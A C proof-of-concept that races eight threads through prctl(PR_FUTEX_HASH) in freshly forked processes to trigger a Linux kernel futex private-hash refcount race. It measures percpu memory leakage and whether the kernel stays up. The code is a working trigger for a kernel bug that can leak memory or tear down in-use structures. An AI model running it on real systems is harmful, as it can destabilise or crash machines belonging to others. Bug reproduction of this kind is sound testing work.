/*
 * l78_futex_hash.c - trigger the 6.18.47 "initial mm->futex.phash.ref" race.
 *
 * Pre-fix code in futex_hash_allocate():
 *     mm->futex_ref = alloc_percpu(unsigned int);   // publish first
 *     if (!mm->futex_ref) return -ENOMEM;
 *     this_cpu_inc(*mm->futex_ref);                 // then increment
 * Two tasks sharing the mm can both observe NULL and both publish; the loser's
 * counter is never freed and the ref bookkeeping diverges from the published
 * counter, so the private hash can be torn down while still in use.
 *
 * The fix takes the initial reference *before* publishing and uses cmpxchg.
 *
 * Each attempt needs a fresh mm (once the hash exists the path is skipped), so
 * this forks a child per attempt and lets several threads race inside it.  We
 * only measure: Percpu growth (a leaked alloc_percpu) and whether the kernel
 * survives.  Nothing is written to the device.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef PR_FUTEX_HASH
#define PR_FUTEX_HASH 78
#endif
#define PR_FUTEX_HASH_SET_SLOTS 1
#define PR_FUTEX_HASH_GET_SLOTS 2

#define NTHREADS 8
#define SLOTS 64

static pthread_barrier_t g_bar;
static volatile int g_ok[NTHREADS];
static volatile int g_errno[NTHREADS];

static void *racer(void *arg)
{
    int i = (int)(long)arg;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(i % 8, &s);
    sched_setaffinity(0, sizeof s, &s);

    pthread_barrier_wait(&g_bar);
    errno = 0;
    long r = prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_SET_SLOTS, (unsigned long)SLOTS, 1UL, 0UL);
    g_ok[i] = (r == 0);
    g_errno[i] = errno;
    return NULL;
}

static int percpu_kb(void)
{
    FILE *f = fopen("/proc/meminfo", "re");
    char line[256];
    int kb = -1;
    if (!f) return -1;
    while (fgets(line, sizeof line, f))
        if (sscanf(line, "Percpu: %d kB", &kb) == 1) break;
    fclose(f);
    return kb;
}

int main(int argc, char **argv)
{
    int attempts = argc > 1 ? atoi(argv[1]) : 200;
    printf("=== l78 futex_hash race (uid=%d, attempts=%d, threads=%d) ===\n",
           (int)getuid(), attempts, NTHREADS);

    int base = percpu_kb();
    printf("Percpu baseline: %d kB\n", base);

    int two_winners = 0, survived = 0;
    for (int a = 0; a < attempts; a++) {
        pid_t p = fork();
        if (p == 0) {
            pthread_barrier_init(&g_bar, NULL, NTHREADS);
            pthread_t th[NTHREADS];
            for (int i = 0; i < NTHREADS; i++) pthread_create(&th[i], NULL, racer, (void *)(long)i);
            for (int i = 0; i < NTHREADS; i++) pthread_join(th[i], NULL);
            int ok = 0;
            for (int i = 0; i < NTHREADS; i++) ok += g_ok[i];
            long slots = prctl(PR_FUTEX_HASH, PR_FUTEX_HASH_GET_SLOTS, 0UL, 0UL, 0UL);
            /* >1 success means several threads ran the allocate path this mm */
            if (ok > 1) _exit(100 + (ok > 99 ? 99 : ok));
            (void)slots;
            _exit(ok == 1 ? 0 : 1);
        }
        if (p < 0) break;
        int st = 0;
        waitpid(p, &st, 0);
        survived++;
        if (WIFEXITED(st) && WEXITSTATUS(st) >= 100) two_winners++;
    }

    int now = percpu_kb();
    printf("attempts=%d survived=%d multi_success=%d\n", survived, survived, two_winners);
    printf("Percpu now: %d kB (delta %d kB)\n", now, base >= 0 && now >= 0 ? now - base : -1);
    printf("done\n");
    return 0;
}
